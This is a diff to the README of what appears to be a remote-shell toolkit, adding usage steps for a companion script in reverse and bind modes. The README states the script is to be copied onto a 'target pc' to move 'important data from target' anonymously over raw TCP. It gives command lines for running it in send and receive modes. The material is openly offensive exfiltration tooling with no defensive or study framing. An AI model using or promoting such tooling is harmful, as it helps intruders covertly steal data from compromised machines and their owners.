@@ -79,13 +79,15 @@ And MAGIC !! you will entirely get the remote console with all above mentioned f
 
 ### Complimentary File transfer utility
 
-![demo image2](demo-ft.jpg)
-
 File transfer script (rvc-ft) however is not the actual part of this repo but 
 after some experiments using rsh and bsh we urgently felt a need for an anonymous file transfer
 to get important data from target. For that we wrote our own naive FTP over TCP in python
-to enable raw file transfer. This script is to be copied with the other scripts on
-target pc to enable its features obviously:
+to enable raw file transfer. We have written this FTP in both reverse and bind methodologies.
+This script is to be copied with the other scripts on target pc to enable its features obviously.
+
+A) Reverse transfer
+
+![demo image2](demo-rft.jpg)
 
 1) first start rvc-ft in reciever mode 
 ```
@@ -94,6 +96,21 @@ target pc to enable its features obviously:
 2) then transmit the remote file
 ```
 ./rvc-ft send (reciever hostname) (port no.) (path/to/file)
+```
+3) have patience and DONE!! because no progress bars, etc.
+
+
+B) Bind transfer
+
+![demo image3](demo-bft.jpg)
+
+1) first start rvc-ft in sender mode 
+```
+./rvc-bft send (sender hostname) (port no.) (path/to/file)
+```
+2) then transmit the remote file
+```
+./rvc-bft recv (sender hostname) (port no.) (path/to/save/file/as)
 ```
 3) have patience and DONE!! because no progress bars, etc.
 
